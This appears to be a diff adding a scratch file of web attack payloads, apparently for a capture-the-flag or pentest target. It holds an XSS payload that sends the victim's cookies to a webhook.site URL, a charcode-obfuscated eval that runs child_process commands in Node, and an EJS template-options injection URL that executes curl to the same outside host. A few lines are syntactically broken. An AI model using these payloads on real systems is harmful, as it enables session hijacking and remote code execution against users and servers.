@@ -1,0 +1,12 @@
+?src=a+onerror=document.location=\"https://webhook.site/6105ba4e-8d9e-4d85-ba51-1ab409e5825e/c\"%2bdocument.cookie;
+
+console.log(eval("1+1").toString());
+
+eval(eval("String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,108,115,39,41)";););
+
+
+function hello(){console.log(123)}; hello();
+
+eval("const done=this.async();exec('echo "HELLO"',function(){done();});")
+
+http://localhost:10001/admin?settings[view%20options][async]=1&settings[view%20options][client]=1&settings[view%20options][escapeFunction]=process.mainModule.require(%22child_process%22).execSync(%22curl%20https://webhook.site/6105ba4e-8d9e-4d85-ba51-1ab409e5825e%22)&settings[view%20options][debug]=1
